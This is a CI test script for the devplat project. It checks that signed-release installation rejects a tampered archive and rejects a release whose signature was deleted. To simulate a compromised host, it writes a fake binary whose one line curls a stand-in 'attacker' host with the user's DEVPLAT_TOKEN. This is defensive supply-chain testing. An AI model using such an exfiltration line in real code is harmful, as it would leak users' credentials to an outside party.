#!/usr/bin/env bash
# End-to-end proof of the release signing chain. Run by CI on every push.
#
# Builds a real signed release with a throwaway key, serves it over HTTP the way
# get.devplat.ch does, installs from it — and then plays the two attacks the
# signature exists to stop: a release host that swaps the binary and rewrites
# checksums.txt to match, and one that deletes the signature hoping the client
# falls back.
#
# In CI rather than run by hand once, because the parts that can rot are exactly
# the parts nobody exercises between releases. build-release.sh, install.sh and
# internal/release have to agree on the signature format, and the moment they
# stop agreeing every user's install breaks at once — which is not something to
# discover on release day.
#
# Uses a generated key throughout: the real signing key must never be reachable
# from CI, and nothing here needs it.
set -uo pipefail

REPO="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORK=$(mktemp -d)
# A fresh port per run, and the server killed through a trap.
#
# The first version of this script pinned a port and wrote the wrong pid to a
# file it then deleted, so the server outlived the run. The next run bound
# nothing, the leftover one answered for a directory that no longer existed, and
# four checks failed in a way that looked exactly like the installer being
# broken. In CI that is a flaky build chasing a bug that is not there.
PORT=$(( 20000 + RANDOM % 20000 ))
pass=0; fail=0
check() { # name, condition-exitcode
  if [ "$2" -eq 0 ]; then echo "PASS  $1"; pass=$((pass+1));
  else echo "FAIL  $1"; fail=$((fail+1)); fi
}

cd "$WORK"
openssl genpkey -algorithm ed25519 -out key.pem 2>/dev/null
openssl pkey -in key.pem -pubout -out pub.pem 2>/dev/null
PUBKEY=$(cat pub.pem)

# A repo copy with the test key baked into the binary and both installers, so
# the whole thing runs exactly as it would in production.
# --exclude dist: a local build leaves one behind, and copying it in would make
# this run depend on what happened last on this machine rather than on the repo.
mkdir repo
tar -C "$REPO" --exclude=./dist --exclude=./.git -cf - . | tar -C repo -xf -
cd repo
python3 - "$PUBKEY" <<'PY'
import sys, re
pub = sys.argv[1].strip()
for path, pattern in [
    ('internal/release/release.go', r'-----BEGIN PUBLIC KEY-----\nPLACEHOLDER-NO-RELEASE-KEY-CONFIGURED\n-----END PUBLIC KEY-----'),
    ('install.sh', r'-----BEGIN PUBLIC KEY-----\nPLACEHOLDER-NO-RELEASE-KEY-CONFIGURED\n-----END PUBLIC KEY-----'),
    ('install.ps1', r'-----BEGIN PUBLIC KEY-----\nPLACEHOLDER-NO-RELEASE-KEY-CONFIGURED\n-----END PUBLIC KEY-----'),
]:
    s = open(path).read()
    s = re.sub(pattern, pub, s)
    open(path, 'w').write(s)
PY

# The consistency test must still pass once a real key is in all three places —
# this is what a key rotation looks like, and it must not be the thing that
# breaks it.
go test ./internal/release/ -run Consistency >/dev/null 2>&1
check "the three key copies stay in agreement after a rotation" $?

DEVPLAT_RELEASE_KEY="$WORK/key.pem" ./scripts/build-release.sh v9.9.9 >/dev/null 2>&1
check "build-release.sh produces a signed release" $?
test -f dist/v9.9.9/checksums.txt.sig
check "checksums.txt.sig is written" $?

# Refuses to package unsigned unless explicitly told.
./scripts/build-release.sh v9.9.8 >/dev/null 2>&1
[ $? -ne 0 ]
check "build-release.sh refuses to package an unsigned release" $?

# --- serve it like the real host ------------------------------------------
mkdir -p "$WORK/pub/v9.9.9"
cp dist/v9.9.9/* "$WORK/pub/v9.9.9/"
echo "v9.9.9" > "$WORK/pub/version.txt"
cp install.sh "$WORK/pub/"
( cd "$WORK/pub" && exec python3 -m http.server "$PORT" >/dev/null 2>&1 ) &
SERVER_PID=$!
trap 'kill "$SERVER_PID" 2>/dev/null; rm -rf "$WORK"' EXIT
sleep 2

install_here() { # dir
  DEVPLAT_INSTALL_BASE="http://127.0.0.1:$PORT" DEVPLAT_INSTALL_DIR="$1" \
    sh "$WORK/pub/install.sh" 2>&1
}

# --- the honest path -------------------------------------------------------
out=$(install_here "$WORK/bin-good"); echo "DEBUG-GOOD: $out" >&2
echo "$out" | grep -q "signature ok"
check "a genuine release installs and reports the signature verified" $?
test -x "$WORK/bin-good/devplat"
check "the binary landed on disk" $?

# --- the attack ------------------------------------------------------------
# The release host is compromised: the attacker replaces the archive AND
# rewrites checksums.txt so the hash matches their binary. This is exactly what
# the old checksum-only installer would have accepted without a murmur.
cd "$WORK/pub/v9.9.9"
mkdir -p evil && echo "#!/bin/sh" > evil/devplat && echo "curl http://attacker/\$DEVPLAT_TOKEN" >> evil/devplat
chmod +x evil/devplat
tar -czf devplat-v9.9.9-linux-amd64.tar.gz -C evil devplat
sha256sum -- *.tar.gz *.zip > checksums.txt   # rewritten to match the malicious archive
cd "$WORK"

out=$(install_here "$WORK/bin-evil")
rc=$?
[ $rc -ne 0 ]
check "a tampered release is REFUSED (installer exits non-zero)" $?
echo "$out" | grep -q "SIGNATURE VERIFICATION FAILED"
check "the refusal names signature verification as the reason" $?
test ! -e "$WORK/bin-evil/devplat"
check "no binary was written from the tampered release" $?

# --- the downgrade ---------------------------------------------------------
# The attacker instead deletes the signature, hoping the client falls back.
rm -f "$WORK/pub/v9.9.9/checksums.txt.sig"
out=$(install_here "$WORK/bin-nosig")
[ $? -ne 0 ]
check "a release with the signature REMOVED is refused, not downgraded" $?
echo "$out" | grep -q "has no signature"
check "the refusal explains that a signature was expected" $?
test ! -e "$WORK/bin-nosig/devplat"
check "no binary was written when the signature was missing" $?

echo
echo "$pass/$((pass+fail)) passed"
[ "$fail" -eq 0 ]
